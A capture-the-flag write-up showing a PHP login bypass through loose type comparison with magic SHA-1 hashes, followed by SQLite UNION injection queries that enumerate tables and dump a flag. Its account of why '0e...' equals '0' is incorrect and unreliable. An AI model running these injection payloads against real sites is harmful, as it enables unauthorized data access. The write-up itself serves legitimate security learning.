# why-are-types-weird

## Description

Jacob is making a simple website to test out his PHP skills. He is certain that his website has absolutely zero security issues.

Find out the fatal bug in his website.

## Solution

After opening instance we are given a login form, trying simple SQLi injection doesnt work. So I decided to take a look at source code.

```html
<a href="source.php">View login source</a>
```

0w0 source.php?

```php
<?php
if (isset($_GET['but_submit'])) {
    $username = $_GET['txt_uname'];
    $password = $_GET['txt_pwd'];
    if ($username !== "admin") {
        echo "Invalid username";
    } else if (hash('sha1', $password) == "0") {
        session_start();
        $_SESSION['username'] = $username;
        header("Location: admin.php");
    } else {
        echo "Invalid password";
    }
}
```

Nice. Attack vector is now clear. Username must be admin and hash of password should equal 0. Logically speaking this is impossible, but since we are in PHP... 

`($username !== "admin")` This is safe comparison<br>
`(hash('sha1', $password) == "0")` This isnt. Notice `==`. The method is called [Type  Juggling](https://www.php.net/manual/en/language.types.type-juggling.php)

When PHP compares two strings, it compares the characters of the strings, one by one. The first character of "0e..." (hash) is "0", and the first character of "0" is also "0". Therefore, the strings are equal, even though they represent different numbers.

Use any SHA-1 value from [Magic hashes – PHP hash "collisions"](https://github.com/spaze/hashes/blob/master/sha1.md) with username "admin" to login.

After login we are redirected to `Admin Panel` where we can search for users. Quick recon shows user with id 3 has the flag, but the flag is fake! I tried enumerating up till 30 ids, but nothing. Nor did id of 0 work. So there must be something else.

If we enter number + `'` (quote) we are given an error.

```
Warning: SQLite3::query(): Unable to prepare statement: 1, unrecognized token: "'" in /var/www/html/read_details.php on line 8
```

From the error we learned that SQLi is possible and DBMS is SQLite3.

Navigating to [PayloadAllTheThings - SQLite Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md) gives us injections we could try.

We need to discover if there are other tables or not, but first we need to match columns count with UNION. Logically we see 3 fields so I tried `1 UNION SELECT NULL,NULL,NULL` and got an extra empty row meaning UNION needs 3 fields.

Tables:
```
1 UNION SELECT NULL,NULL,group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'

>>> users,power_users
```

Table Columns:

```
1 UNION SELECT NULL,NULL,sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='power_users'

>>> CREATE TABLE power_users ( id integer not null constraint power_users_pk primary key autoincrement, username varchar(10), password varchar(80) )
```

Rows From "power_users":
```
1 UNION SELECT * FROM power_users

>>> 2 | admin | dsc{tYp3_juGgl1nG_i5_cr4zY}
```
::: tip Flag
`dsc{tYp3_juGgl1nG_i5_cr4zY}`
:::